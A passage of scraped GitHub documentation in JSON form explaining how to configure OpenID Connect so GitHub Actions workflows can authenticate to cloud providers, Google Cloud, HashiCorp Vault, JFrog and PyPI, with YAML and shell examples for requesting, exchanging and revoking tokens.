        "text": "Using official actions"
      },
      {
        "type": "paragraph",
        "text": "If your cloud provider has created an official action for using OIDC with GitHub Actions, it will allow you to easily exchange the OIDC token for an access token. You can then update your workflows to use this token when accessing cloud resources."
      },
      {
        "type": "paragraph",
        "text": "For example, Alibaba Cloud createdaliyun/configure-aliyun-credentials-actionto integrate with using OIDC with GitHub."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using custom actions"
      },
      {
        "type": "paragraph",
        "text": "If your cloud provider doesn't have an official action, or if you prefer to create custom scripts, you can manually request the JSON Web Token (JWT) from GitHub's OIDC provider."
      },
      {
        "type": "paragraph",
        "text": "If you're not using an official action, then GitHub recommends that you use the Actions core toolkit. Alternatively, you can use the following environment variables to retrieve the token:ACTIONS_ID_TOKEN_REQUEST_TOKEN,ACTIONS_ID_TOKEN_REQUEST_URL."
      },
      {
        "type": "paragraph",
        "text": "To update your workflows using this approach, you will need to make three changes to your YAML:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Add permissions settings for the token.",
          "Add code that requests the OIDC token from GitHub's OIDC provider.",
          "Add code that exchanges the OIDC token with your cloud provider for an access token."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Requesting the JWT using the Actions core toolkit"
      },
      {
        "type": "paragraph",
        "text": "The following example demonstrates how to useactions/github-scriptwith thecoretoolkit to request the JWT from GitHub's OIDC provider. For more information, seeCreating a JavaScript action."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  job:\n    environment: Production\n    runs-on: ubuntu-latest\n    steps:\n    - name: Install OIDC Client from Core Package\n      run: npm install @actions/core@1.6.0 @actions/http-client\n    - name: Get Id Token\n      uses: actions/github-script@v7\n      id: idtoken\n      with:\n        script: |\n          const coredemo = require('@actions/core')\n          let id_token = await coredemo.getIDToken()\n          coredemo.setOutput('id_token', id_token)"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Requesting the JWT using environment variables"
      },
      {
        "type": "paragraph",
        "text": "The following example demonstrates how to use environment variables to request a JSON Web Token."
      },
      {
        "type": "paragraph",
        "text": "For your deployment job, you will need to define the token settings, usingactions/github-scriptwith thecoretoolkit. For more information, seeCreating a JavaScript action."
      },
      {
        "type": "paragraph",
        "text": "For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  job:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/github-script@v7\n      id: script\n      timeout-minutes: 10\n      with:\n        debug: true\n        script: |\n          const token = process.env['ACTIONS_RUNTIME_TOKEN']\n          const runtimeUrl = process.env['ACTIONS_ID_TOKEN_REQUEST_URL']\n          core.setOutput('TOKEN', token.trim())\n          core.setOutput('IDTOKENURL', runtimeUrl.trim())"
      },
      {
        "type": "paragraph",
        "text": "You can then usecurlto retrieve a JWT from the GitHub OIDC provider. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- run: |\n        IDTOKEN=$(curl -H \"Authorization: Bearer ${{steps.script.outputs.TOKEN}}\" ${{steps.script.outputs.IDTOKENURL}}  -H \"Accept: application/json; api-version=2.0\" -H \"Content-Type: application/json\" -d \"{}\" | jq -r '.value')\n        echo $IDTOKEN\n        jwtd() {\n            if [[ -x $(command -v jq) ]]; then\n                jq -R 'split(\".\") | .[0],.[1] | @base64d | fromjson' <<< \"${1}\"\n                echo \"Signature: $(echo \"${1}\" | awk -F'.' '{print $3}')\"\n            fi\n        }\n        jwtd $IDTOKEN\n        echo \"idToken=${IDTOKEN}\" >> $GITHUB_OUTPUT\n      id: tokenid"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Getting the access token from the cloud provider"
      },
      {
        "type": "paragraph",
        "text": "You will need to present the OIDC JSON web token to your cloud provider in order to obtain an access token."
      },
      {
        "type": "paragraph",
        "text": "For each deployment, your workflows must use cloud login actions (or custom scripts) that fetch the OIDC token and present it to your cloud provider. The cloud provider then validates the claims in the token; if successful, it provides a cloud access token that is available only to that job run. The provided access token can then be used by subsequent actions in the job to connect to the cloud and deploy to its resources."
      },
      {
        "type": "paragraph",
        "text": "The steps for exchanging the OIDC token for an access token will vary for each cloud provider."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Accessing resources in your cloud provider"
      },
      {
        "type": "paragraph",
        "text": "Once you've obtained the access token, you can use specific cloud actions or scripts to authenticate to the cloud provider and deploy to its resources. These steps could differ for each cloud provider."
      },
      {
        "type": "paragraph",
        "text": "For example, Alibaba Cloud maintains their own instructions for OIDC authentication. For more information, seeOverview of OIDC-based SSOin the Alibaba Cloud documentation."
      },
      {
        "type": "paragraph",
        "text": "In addition, the default expiration time of this access token could vary between each cloud and can be configurable at the cloud provider's side."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further reading"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Using OpenID Connect with reusable workflows",
          "Communicating with self-hosted runners"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-google-cloud-platform",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "OpenID Connect (OIDC) allows your GitHub Actions workflows to access resources in Google Cloud Platform (GCP), without needing to store the GCP credentials as long-lived GitHub secrets."
      },
      {
        "type": "paragraph",
        "text": "This guide gives an overview of how to configure GCP to trust GitHub's OIDC as a federated identity, and includes a workflow example for thegoogle-github-actions/authaction that uses tokens to authenticate to GCP and access resources."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "To learn the basic concepts of how GitHub uses OpenID Connect (OIDC), and its architecture and benefits, seeAbout security hardening with OpenID Connect.",
          "Before proceeding, you must plan your security strategy to ensure that access tokens are only allocated in a predictable way. To control how your cloud provider issues access tokens, youmustdefine at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources. For more information, seeAbout security hardening with OpenID Connect."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Adding a Google Cloud Workload Identity Provider"
      },
      {
        "type": "paragraph",
        "text": "To configure the OIDC identity provider in GCP, you will need to perform the following configuration. For instructions on making these changes, refer tothe GCP documentation."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create a new identity pool.",
          "Configure the mapping and add conditions.",
          "Connect the new pool to a service account."
        ]
      },
      {
        "type": "paragraph",
        "text": "Additional guidance for configuring the identity provider:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "For security hardening, make sure you've reviewedConfiguring the OIDC trust with the cloud. For an example, seeConfiguring the subject in your cloud provider.",
          "For the service account to be available for configuration, it needs to be assigned to theroles/iam.workloadIdentityUserrole. For more information, seethe GCP documentation.",
          "The Issuer URL to use:https://token.actions.githubusercontent.com"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Updating your GitHub Actions workflow"
      },
      {
        "type": "paragraph",
        "text": "To update your workflows for OIDC, you will need to make two changes to your YAML:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Add permissions settings for the token.",
          "Use thegoogle-github-actions/authaction to exchange the OIDC token (JWT) for a cloud access token."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "When environments are used in workflows or in OIDC policies, we recommend adding protection rules to the environment for additional security. For example, you can configure deployment rules on an environment to restrict which branches and tags can deploy to the environment or access environment secrets. For more information, seeManaging environments for deployment."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Adding permissions settings"
      },
      {
        "type": "paragraph",
        "text": "The job or workflow run requires apermissionssetting withid-token: writeto allow GitHub's OIDC provider to create a JSON Web Token for every run. You won't be able to request the OIDC JWT ID token if thepermissionsforid-tokenis not set towrite, however this value doesn't imply granting write access to any resources, only being able to fetch and set the OIDC token for an action or step to enable authenticating with a short-lived access token. Any actual trust setting is defined using OIDC claims, for more information seeAbout security hardening with OpenID Connect."
      },
      {
        "type": "paragraph",
        "text": "Theid-token: writesetting allows the JWT to be requested from GitHub's OIDC provider using one of these approaches:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Using environment variables on the runner (ACTIONS_ID_TOKEN_REQUEST_URLandACTIONS_ID_TOKEN_REQUEST_TOKEN).",
          "UsinggetIDToken()from the Actions toolkit."
        ]
      },
      {
        "type": "paragraph",
        "text": "If you need to fetch an OIDC token for a workflow, then the permission can be set at the workflow level. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions:\n  id-token: write # This is required for requesting the JWT\n  contents: read  # This is required for actions/checkout"
      },
      {
        "type": "paragraph",
        "text": "If you only need to fetch an OIDC token for a single job, then this permission can be set within that job. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions:\n  id-token: write # This is required for requesting the JWT"
      },
      {
        "type": "paragraph",
        "text": "You may need to specify additional permissions here, depending on your workflow's requirements."
      },
      {
        "type": "paragraph",
        "text": "For reusable workflows that are owned by the same user, organization, or enterprise as the caller workflow, the OIDC token generated in the reusable workflow can be accessed from the caller's context.\nFor reusable workflows outside your enterprise or organization, thepermissionssetting forid-tokenshould be explicitly set towriteat the caller workflow level or in the specific job that calls the reusable workflow.\nThis ensures that the OIDC token generated in the reusable workflow is only allowed to be consumed in the caller workflows when intended."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeReusing workflows."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Requesting the access token"
      },
      {
        "type": "paragraph",
        "text": "Thegoogle-github-actions/authaction receives a JWT from the GitHub OIDC provider, and then requests an access token from GCP. For more information, see the GCPdocumentation."
      },
      {
        "type": "paragraph",
        "text": "This example has a job calledGet_OIDC_ID_tokenthat uses actions to request a list of services from GCP."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "WORKLOAD-IDENTITY-PROVIDER: Replace this with the path to your identity provider in GCP. For example,projects/example-project-id/locations/global/workloadIdentityPools/name-of-pool/providers/name-of-provider",
          "SERVICE-ACCOUNT: Replace this with the name of your service account in GCP."
        ]
      },
      {
        "type": "paragraph",
        "text": "This action exchanges a GitHub OIDC token for a Google Cloud access token, usingWorkload Identity Federation."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: List services in GCP\non:\n  pull_request:\n    branches:\n      - main\n\npermissions:\n  id-token: write\n\njobs:\n  Get_OIDC_ID_token:\n    runs-on: ubuntu-latest\n    steps:\n    - id: 'auth'\n      name: 'Authenticate to GCP'\n      uses: 'google-github-actions/auth@f1e2d3c4b5a6f7e8d9c0b1a2c3d4e5f6a7b8c9d0'\n      with:\n          create_credentials_file: 'true'\n          workload_identity_provider: 'WORKLOAD-IDENTITY-PROVIDER'\n          service_account: 'SERVICE-ACCOUNT'\n    - id: 'gcloud'\n      name: 'gcloud'\n      run: |-\n        gcloud auth login --brief --cred-file=\"${{ steps.auth.outputs.credentials_file_path }}\"\n        gcloud services list"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further reading"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Using OpenID Connect with reusable workflows",
          "Communicating with self-hosted runners"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-hashicorp-vault",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "OpenID Connect (OIDC) allows your GitHub Actions workflows to authenticate with a HashiCorp Vault to retrieve secrets."
      },
      {
        "type": "paragraph",
        "text": "This guide gives an overview of how to configure HashiCorp Vault to trust GitHub's OIDC as a federated identity, and demonstrates how to use this configuration in thehashicorp/vault-actionaction to retrieve secrets from HashiCorp Vault."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "To learn the basic concepts of how GitHub uses OpenID Connect (OIDC), and its architecture and benefits, seeAbout security hardening with OpenID Connect.",
          "Before proceeding, you must plan your security strategy to ensure that access tokens are only allocated in a predictable way. To control how your cloud provider issues access tokens, youmustdefine at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources. For more information, seeAbout security hardening with OpenID Connect."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Adding the identity provider to HashiCorp Vault"
      },
      {
        "type": "paragraph",
        "text": "To use OIDC with HashiCorp Vault, you will need to add a trust configuration for the GitHub OIDC provider. For more information, see the HashiCorp Vaultdocumentation."
      },
      {
        "type": "paragraph",
        "text": "To configure your Vault server to accept JSON Web Tokens (JWT) for authentication:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Enable the JWTauthmethod, and usewriteto apply the configuration to your Vault.\nForoidc_discovery_urlandbound_issuerparameters, usehttps://token.actions.githubusercontent.com. These parameters allow the Vault server to verify the received JSON Web Tokens (JWT) during the authentication process.Shellvault auth enable jwtvault auth enable jwtShellvault write auth/jwt/config \\\n  bound_issuer=\"https://token.actions.githubusercontent.com\" \\\n  oidc_discovery_url=\"https://token.actions.githubusercontent.com\"vault write auth/jwt/config \\\n  bound_issuer=\"https://token.actions.githubusercontent.com\" \\\n  oidc_discovery_url=\"https://token.actions.githubusercontent.com\"",
          "Configure a policy that only grants access to the specific paths your workflows will use to retrieve secrets. For more advanced policies, see the HashiCorp VaultPolicies documentation.Shellvault policy write myproject-production - <<EOF\n# Read-only permission on 'secret/data/production/*' path\n\npath \"secret/data/production/*\" {\n  capabilities = [ \"read\" ]\n}\nEOFvault policy write myproject-production - <<EOF#Read-only permission on'secret/data/production/*'pathpath \"secret/data/production/*\" {\n  capabilities = [ \"read\" ]\n}\nEOF",
          "Configure roles to group different policies together. If the authentication is successful, these policies are attached to the resulting Vault access token.Shellvault write auth/jwt/role/myproject-production -<<EOF\n{\n  \"role_type\": \"jwt\",\n  \"user_claim\": \"actor\",\n  \"bound_claims\": {\n    \"repository\": \"user-or-org-name/repo-name\"\n  },\n  \"policies\": [\"myproject-production\"],\n  \"ttl\": \"10m\"\n}\nEOFvault write auth/jwt/role/myproject-production -<<EOF\n{\n  \"role_type\": \"jwt\",\n  \"user_claim\": \"actor\",\n  \"bound_claims\": {\n    \"repository\": \"user-or-org-name/repo-name\"\n  },\n  \"policies\": [\"myproject-production\"],\n  \"ttl\": \"10m\"\n}\nEOF"
        ]
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "ttldefines the validity of the resulting access token.",
          "Ensure that thebound_claimsparameter is defined for your security requirements, and has at least one condition. Optionally, you can also set thebound_subjectas well as thebound_audiencesparameter.",
          "To check arbitrary claims in the received JWT payload, thebound_claimsparameter contains a set of claims and their required values. In the above example, the role will accept any incoming authentication requests from therepo-namerepository owned by theuser-or-org-nameaccount.",
          "To see all the available claims supported by GitHub's OIDC provider, seeAbout security hardening with OpenID Connect."
        ]
      },
      {
        "type": "paragraph",
        "text": "For more information, see the HashiCorp Vaultdocumentation."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Updating your GitHub Actions workflow"
      },
      {
        "type": "paragraph",
        "text": "To update your workflows for OIDC, you will need to make two changes to your YAML:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Add permissions settings for the token.",
          "Use thehashicorp/vault-actionaction to exchange the OIDC token (JWT) for a cloud access token."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "When environments are used in workflows or in OIDC policies, we recommend adding protection rules to the environment for additional security. For example, you can configure deployment rules on an environment to restrict which branches and tags can deploy to the environment or access environment secrets. For more information, seeManaging environments for deployment."
      },
      {
        "type": "paragraph",
        "text": "To add OIDC integration to your workflows that allow them to access secrets in Vault, you will need to add the following code changes:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Grant permission to fetch the token from the GitHub OIDC provider:The workflow needspermissions:settings with theid-tokenvalue set towrite. This lets you fetch the OIDC token from every job in the workflow.",
          "The workflow needspermissions:settings with theid-tokenvalue set towrite. This lets you fetch the OIDC token from every job in the workflow.",
          "Request the JWT from the GitHub OIDC provider, and present it to HashiCorp Vault to receive an access token:You can use thehashicorp/vault-actionaction to fetch the JWT and receive the access token from Vault, or you could use theActions toolkitto fetch the tokens for your job.",
          "You can use thehashicorp/vault-actionaction to fetch the JWT and receive the access token from Vault, or you could use theActions toolkitto fetch the tokens for your job."
        ]
      },
      {
        "type": "paragraph",
        "text": "This example demonstrates how to use OIDC with the official action to request a secret from HashiCorp Vault."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Adding permissions settings"
      },
      {
        "type": "paragraph",
        "text": "The job or workflow run requires apermissionssetting withid-token: writeto allow GitHub's OIDC provider to create a JSON Web Token for every run. You won't be able to request the OIDC JWT ID token if thepermissionsforid-tokenis not set towrite, however this value doesn't imply granting write access to any resources, only being able to fetch and set the OIDC token for an action or step to enable authenticating with a short-lived access token. Any actual trust setting is defined using OIDC claims, for more information seeAbout security hardening with OpenID Connect."
      },
      {
        "type": "paragraph",
        "text": "Theid-token: writesetting allows the JWT to be requested from GitHub's OIDC provider using one of these approaches:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Using environment variables on the runner (ACTIONS_ID_TOKEN_REQUEST_URLandACTIONS_ID_TOKEN_REQUEST_TOKEN).",
          "UsinggetIDToken()from the Actions toolkit."
        ]
      },
      {
        "type": "paragraph",
        "text": "If you need to fetch an OIDC token for a workflow, then the permission can be set at the workflow level. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions:\n  id-token: write # This is required for requesting the JWT\n  contents: read  # This is required for actions/checkout"
      },
      {
        "type": "paragraph",
        "text": "If you only need to fetch an OIDC token for a single job, then this permission can be set within that job. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions:\n  id-token: write # This is required for requesting the JWT"
      },
      {
        "type": "paragraph",
        "text": "You may need to specify additional permissions here, depending on your workflow's requirements."
      },
      {
        "type": "paragraph",
        "text": "For reusable workflows that are owned by the same user, organization, or enterprise as the caller workflow, the OIDC token generated in the reusable workflow can be accessed from the caller's context.\nFor reusable workflows outside your enterprise or organization, thepermissionssetting forid-tokenshould be explicitly set towriteat the caller workflow level or in the specific job that calls the reusable workflow.\nThis ensures that the OIDC token generated in the reusable workflow is only allowed to be consumed in the caller workflows when intended."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeReusing workflows."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "When thepermissionskey is used, all unspecified permissions are set tono access, with the exception of the metadata scope, which always getsreadaccess. As a result, you may need to add other permissions, such ascontents: read. SeeAutomatic token authenticationfor more information."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Requesting the access token"
      },
      {
        "type": "paragraph",
        "text": "Thehashicorp/vault-actionaction receives a JWT from the GitHub OIDC provider, and then requests an access token from your HashiCorp Vault instance to retrieve secrets. For more information, see the HashiCorp Vault GitHub Actiondocumentation."
      },
      {
        "type": "paragraph",
        "text": "This example demonstrates how to create a job that requests a secret from HashiCorp Vault."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "VAULT-URL: Replace this with the URL of your HashiCorp Vault.",
          "VAULT-NAMESPACE: Replace this with the Namespace you've set in HashiCorp Vault. For example:admin.",
          "ROLE-NAME: Replace this with the role you've set in the HashiCorp Vault trust relationship.",
          "SECRET-PATH: Replace this with the path to the secret you're retrieving from HashiCorp Vault. For example:secret/data/production/ci npmToken."
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  retrieve-secret:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n      contents: read\n    steps:\n      - name: Retrieve secret from Vault\n        uses: hashicorp/vault-action@9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b\n        with:\n          method: jwt\n          url: VAULT-URL\n          namespace: VAULT-NAMESPACE # HCP Vault and Vault Enterprise only\n          role: ROLE-NAME\n          secrets: SECRET-PATH\n\n      - name: Use secret from Vault\n        run: |\n          # This step has access to the secret retrieved above; see hashicorp/vault-action for more details."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "If your Vault server is not accessible from the public network, consider using a self-hosted runner with other available Vaultauth methods. For more information, seeAbout self-hosted runners.",
          "VAULT-NAMESPACEmust be set for a Vault Enterprise (including HCP Vault) deployment. For more information, seeVault namespace."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Revoking the access token"
      },
      {
        "type": "paragraph",
        "text": "By default, the Vault server will automatically revoke access tokens when their TTL is expired, so you don't have to manually revoke the access tokens. However, if you do want to revoke access tokens immediately after your job has completed or failed, you can manually revoke the issued token using theVault API."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Set theexportTokenoption totrue(default:false). This exports the issued Vault access token as an environment variable:VAULT_TOKEN.",
          "Add a step to call theRevoke a Token (Self)Vault API to revoke the access token."
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  retrieve-secret:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n      contents: read\n    steps:\n      - name: Retrieve secret from Vault\n        uses: hashicorp/vault-action@9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b\n        with:\n          exportToken: true\n          method: jwt\n          url: VAULT-URL\n          role: ROLE-NAME\n          secrets: SECRET-PATH\n\n      - name: Use secret from Vault\n        run: |\n          # This step has access to the secret retrieved above; see hashicorp/vault-action for more details.\n\n      - name: Revoke token\n        # This step always runs at the end regardless of the previous steps result\n        if: always()\n        run: |\n          curl -X POST -sv -H \"X-Vault-Token: ${{ env.VAULT_TOKEN }}\" \\\n            VAULT-URL/v1/auth/token/revoke-self"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further reading"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Using OpenID Connect with reusable workflows",
          "Communicating with self-hosted runners"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-jfrog",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "OpenID Connect (OIDC) allows your GitHub Actions workflows to authenticate withJFrogto download and publish artifacts without storing JFrog passwords, tokens, or API keys in GitHub."
      },
      {
        "type": "paragraph",
        "text": "This guide gives an overview of how to configure JFrog to trust GitHub's OIDC as a federated identity, and demonstrates how to use this configuration in a GitHub Actions workflow."
      },
      {
        "type": "paragraph",
        "text": "For an example GitHub Actions workflow, seeSample GitHub Actions Integrationin the JFrog documentation."
      },
      {
        "type": "paragraph",
        "text": "For an example GitHub Actions workflow using the JFrog CLI, seebuild-publish.ymlin thejfrog-github-oidc-examplerepository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "To learn the basic concepts of how GitHub uses OpenID Connect (OIDC), and its architecture and benefits, seeAbout security hardening with OpenID Connect.",
          "Before proceeding, you must plan your security strategy to ensure that access tokens are only allocated in a predictable way. To control how your cloud provider issues access tokens, youmustdefine at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources. For more information, seeAbout security hardening with OpenID Connect.",
          "To be secure, you need to set a Claims JSON in JFrog when configuring identity mappings. For more information, seeAUTOTITLEandAbout security hardening with OpenID Connect.For example, you can setisstohttps://token.actions.githubusercontent.com, and therepositoryto something like \"octo-org/octo-repo\"`. This will ensure only Actions workflows from the specified repository will have access to your JFrog platform. The following is an example Claims JSON when configuring identity mappings.JSON{\n  \"iss\": \"https://token.actions.githubusercontent.com\",\n  \"repository\": \"octo-org/octo-repo\"\n}{\"iss\":\"https://token.actions.githubusercontent.com\",\"repository\":\"octo-org/octo-repo\"}"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Adding the identity provider to JFrog"
      },
      {
        "type": "paragraph",
        "text": "To use OIDC with JFrog, establish a trust relationship between GitHub Actions and the JFrog platform. For more information about this process, seeOpenID Connect Integrationin the JFrog documentation."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Sign in to your JFrog Platform.",
          "Configure trust between JFrog and your GitHub Actions workflows.",
          "Configure identity mappings."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Updating your GitHub Actions workflow"
      },
      {
        "type": "paragraph",
        "text": "Once you establish a trust relationship between GitHub Actions and the JFrog platform, you can update your GitHub Actions workflow file."
      },
      {
        "type": "paragraph",
        "text": "In your GitHub Actions workflow file, ensure you are using the provider name and audience you configured in the JFrog Platform."
      },
      {
        "type": "paragraph",
        "text": "The following example uses the placeholderYOUR_PROVIDER_NAME."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Fetch Access Token from Artifactory\n        id: fetch_access_token\n        env:\n          ID_TOKEN: $\n        run: |\n          ACCESS_TOKEN=$(curl \\\n          -X POST \\\n          -H \"Content-type: application/json\" \\\n          https://example.jfrog.io/access/api/v1/oidc/token \\\n          -d \\\n          \"{\\\"grant_type\\\": \\\"urn:ietf:params:oauth:grant-type:token-exchange\\\", \\\"subject_token_type\\\":\\\"urn:ietf:params:oauth:token-type:id_token\\\", \\\"subject_token\\\": \\\"$ID_TOKEN\\\", \\\"provider_name\\\": \\\"YOUR_PROVIDER_NAME\\\"}\" | jq .access_token | tr -d '\"')\n          echo ACCESS_TOKEN=$ACCESS_TOKEN >> $GITHUB_OUTPUT"
      },
      {
        "type": "paragraph",
        "text": "The following example shows part of a GitHub Actions workflow file using cURL."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Get ID Token (cURL method)\n        id: idtoken\n        run: |\n          ID_TOKEN=$(curl -sLS -H \"User-Agent: actions/oidc-client\" -H \"Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN\" \\\n          \"${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=jfrog-github\" | jq .value | tr -d '\"')\n          echo \"ID_TOKEN=${ID_TOKEN}\" >> $GITHUB_OUTPUT"
      },
      {
        "type": "paragraph",
        "text": "Alternatively, you can set the audience as an environment variable using theenvcontext. For more information about theenvcontext, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "When environments are used in workflows or in OIDC policies, we recommend adding protection rules to the environment for additional security. For example, you can configure deployment rules on an environment to restrict which branches and tags can deploy to the environment or access environment secrets. For more information, seeManaging environments for deployment."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  build:\n    runs-on: ubuntu-latest\n    env:\n      OIDC_AUDIENCE: 'YOUR_AUDIENCE'"
      },
      {
        "type": "paragraph",
        "text": "Then, in your workflow file, retrieve the value of the variables stored in theenvcontext. The following example uses theenvcontext to retrieve the OIDC audience."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Get ID Token (using env context)\n        uses: actions/github-script@v7\n        id: idtoken\n        with:\n          script: |\n            const coredemo = require('@actions/core');\n            let id_token = await coredemo.getIDToken(process.env.OIDC_AUDIENCE);\n            coredemo.setOutput('id_token', id_token);"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-pypi",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "OpenID Connect (OIDC) allows your GitHub Actions workflows to authenticate withPyPIto publish Python packages."
      },
      {
        "type": "paragraph",
        "text": "This guide gives an overview of how to configure PyPI to trust GitHub's OIDC as a federated identity, and demonstrates how to use this configuration in thepypa/gh-action-pypi-publishaction to publish packages to PyPI (or other Python package repositories) without any manual API token management."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Prerequisites"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "To learn the basic concepts of how GitHub uses OpenID Connect (OIDC), and its architecture and benefits, seeAbout security hardening with OpenID Connect.",
          "Before proceeding, you must plan your security strategy to ensure that access tokens are only allocated in a predictable way. To control how your cloud provider issues access tokens, youmustdefine at least one condition, so that untrusted repositories can’t request access tokens for your cloud resources. For more information, seeAbout security hardening with OpenID Connect."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Adding the identity provider to PyPI"
      },
      {
        "type": "paragraph",
        "text": "To use OIDC with PyPI, add a trust configuration that links each project on PyPI to each repository and workflow combination that's allowed to publish for it."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Sign in to PyPI and navigate to the trusted publishing settings for the project you'd like to configure. For a project namedmyproject, this will be athttps://pypi.org/manage/project/myproject/settings/publishing/.",
          "Configure a trust relationship between the PyPI project and a GitHub repository (and workflow within the repository). For example, if your GitHub repository is atmyorg/myprojectand your release workflow is defined inrelease.ymlwith an environment ofrelease, you should use the following settings for your trusted publisher on PyPI.NoteEnter these values carefully. Giving the incorrect user, repository, or workflow the ability to publish to your PyPI project is equivalent to sharing an API token.Owner:myorgRepository name:myprojectWorkflow name:release.yml(Optionally) a GitHub Actions environment name:release",
          "Owner:myorg",
          "Repository name:myproject",
          "Workflow name:release.yml",
          "(Optionally) a GitHub Actions environment name:release"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Updating your GitHub Actions workflow"
      },
      {
        "type": "paragraph",
        "text": "Once your trusted publisher is registered on PyPI, you can update your release workflow to use trusted publishing."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "When environments are used in workflows or in OIDC policies, we recommend adding protection rules to the environment for additional security. For example, you can configure deployment rules on an environment to restrict which branches and tags can deploy to the environment or access environment secrets. For more information, seeManaging environments for deployment."
      },
      {
        "type": "paragraph",
